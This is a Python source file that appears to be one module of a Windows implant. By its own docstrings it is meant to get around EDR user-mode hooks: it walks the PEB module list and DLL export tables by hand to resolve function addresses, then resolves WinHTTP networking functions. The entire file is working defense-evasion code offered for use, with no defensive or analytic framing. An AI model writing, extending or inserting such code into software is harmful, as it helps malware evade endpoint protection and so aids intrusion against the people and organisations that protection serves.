"""
PEB & EAT Walker - IAT Cloaking Module
=======================================
Manually walks PEB InLoadOrderModuleList and Export Address Table
to resolve DLL/function addresses without LoadLibrary/GetProcAddress.

This bypasses EDR user-mode IAT hooks by avoiding Windows API resolution.
"""

import ctypes
import platform
from typing import Optional, Dict


# PEB/LDR offsets (x64 Windows)
PEB_OFFSET = 0x60
LDR_OFFSET = 0x18
IN_LOAD_ORDER_MODULE_LIST_OFFSET = 0x10
BASE_DLL_NAME_OFFSET = 0x58
DLL_BASE_OFFSET = 0x30


def get_peb_address() -> int:
    """Get PEB address via TEB->ProcessEnvironmentBlock."""
    if platform.system() != "Windows":
        return 0
    
    try:
        # Use NtCurrentTeb() to get TEB, then read PEB pointer
        teb = ctypes.windll.ntdll.NtCurrentTeb()
        # TEB structure: ProcessEnvironmentBlock is at offset 0x60 on x64
        peb_ptr = ctypes.cast(teb + PEB_OFFSET, ctypes.POINTER(ctypes.c_uint64))
        return peb_ptr.contents.value
    except Exception:
        return 0


class PEBModuleFinder:
    """
    EDR's LoadLibrary / GetProcAddress hooks bypass.
    Manually walks PEB and EAT to resolve modules and functions.
    """

    def __init__(self):
        self.peb_addr = get_peb_address()
        self._module_cache: Dict[str, int] = {}

    def get_module_base(self, module_name: str) -> int:
        """Find module base by walking PEB InLoadOrderModuleList."""
        if not self.peb_addr:
            return 0
        
        if module_name.lower() in self._module_cache:
            return self._module_cache[module_name.lower()]
        
        try:
            # PEB -> Ldr (_PEB_LDR_DATA)
            ldr_ptr = ctypes.cast(
                self.peb_addr + LDR_OFFSET,
                ctypes.POINTER(ctypes.c_uint64)
            ).contents.value
            
            # Ldr -> InLoadOrderModuleList (Flink)
            list_head = ldr_ptr + IN_LOAD_ORDER_MODULE_LIST_OFFSET
            flink = ctypes.cast(
                list_head,
                ctypes.POINTER(ctypes.c_uint64)
            ).contents.value
            
            current_node = flink
            while current_node != list_head and current_node != 0:
                # LDR_DATA_TABLE_ENTRY structure
                base_dll_name_ptr = current_node + BASE_DLL_NAME_OFFSET
                dll_base_ptr = current_node + DLL_BASE_OFFSET
                
                # Read UNICODE_STRING
                length = ctypes.cast(
                    base_dll_name_ptr,
                    ctypes.POINTER(ctypes.c_ushort)
                ).contents.value
                
                buffer_addr = ctypes.cast(
                    base_dll_name_ptr + 8,
                    ctypes.POINTER(ctypes.c_uint64)
                ).contents.value
                
                if buffer_addr and length > 0:
                    try:
                        dll_name = ctypes.string_at(
                            buffer_addr,
                            length
                        ).decode('utf-16-le', errors='ignore').lower()
                        
                        if module_name.lower() in dll_name:
                            base_addr = ctypes.cast(
                                dll_base_ptr,
                                ctypes.POINTER(ctypes.c_uint64)
                            ).contents.value
                            self._module_cache[module_name.lower()] = base_addr
                            return base_addr
                    except Exception:
                        pass
                
                # Move to next entry
                current_node = ctypes.cast(
                    current_node,
                    ctypes.POINTER(ctypes.c_uint64)
                ).contents.value
        except Exception:
            pass
        
        return 0

    def get_proc_address_manual(self, module_base: int, func_name: str) -> int:
        """Manually walk Export Address Table to resolve function."""
        if not module_base:
            return 0
        
        try:
            # IMAGE_DOS_HEADER -> e_lfanew
            e_lfanew = ctypes.cast(
                module_base + 0x3C,
                ctypes.POINTER(ctypes.c_uint32)
            ).contents.value
            
            nt_headers = module_base + e_lfanew
            
            # IMAGE_NT_HEADERS64 -> OptionalHeader -> DataDirectory[0] (Export Directory)
            export_dir_rva = ctypes.cast(
                nt_headers + 0x88,
                ctypes.POINTER(ctypes.c_uint32)
            ).contents.value
            
            if not export_dir_rva:
                return 0
            
            export_dir = module_base + export_dir_rva
            
            # IMAGE_EXPORT_DIRECTORY fields
            num_names = ctypes.cast(
                export_dir + 0x18,
                ctypes.POINTER(ctypes.c_uint32)
            ).contents.value
            
            addr_functions_rva = ctypes.cast(
                export_dir + 0x1C,
                ctypes.POINTER(ctypes.c_uint32)
            ).contents.value
            
            addr_names_rva = ctypes.cast(
                export_dir + 0x20,
                ctypes.POINTER(ctypes.c_uint32)
            ).contents.value
            
            addr_ordinals_rva = ctypes.cast(
                export_dir + 0x24,
                ctypes.POINTER(ctypes.c_uint32)
            ).contents.value
            
            funcs_arr = module_base + addr_functions_rva
            names_arr = module_base + addr_names_rva
            ords_arr = module_base + addr_ordinals_rva
            
            for i in range(num_names):
                name_rva = ctypes.cast(
                    names_arr + (i * 4),
                    ctypes.POINTER(ctypes.c_uint32)
                ).contents.value
                
                curr_name = ctypes.string_at(
                    module_base + name_rva,
                    256
                ).decode('ascii', errors='ignore').split('\x00')[0]
                
                if curr_name == func_name:
                    ordinal = ctypes.cast(
                        ords_arr + (i * 2),
                        ctypes.POINTER(ctypes.c_ushort)
                    ).contents.value
                    
                    func_rva = ctypes.cast(
                        funcs_arr + (ordinal * 4),
                        ctypes.POINTER(ctypes.c_uint32)
                    ).contents.value
                    
                    return module_base + func_rva
        except Exception:
            pass
        
        return 0

    def resolve_winhttp_functions(self) -> Dict[str, int]:
        """Resolve common WinHTTP functions."""
        winhttp_base = self.get_module_base("winhttp.dll")
        if not winhttp_base:
            return {}
        
        functions = [
            "WinHttpOpen",
            "WinHttpConnect",
            "WinHttpOpenRequest",
            "WinHttpSendRequest",
            "WinHttpReceiveResponse",
            "WinHttpReadData",
            "WinHttpCloseHandle",
        ]
        
        resolved = {}
        for func_name in functions:
            addr = self.get_proc_address_manual(winhttp_base, func_name)
            if addr:
                resolved[func_name] = addr
        
        return resolved


# Singleton instance
_peb_finder: Optional[PEBModuleFinder] = None


def get_peb_finder() -> PEBModuleFinder:
    """Get singleton PEB module finder instance."""
    global _peb_finder
    if _peb_finder is None:
        _peb_finder = PEBModuleFinder()
    return _peb_finder
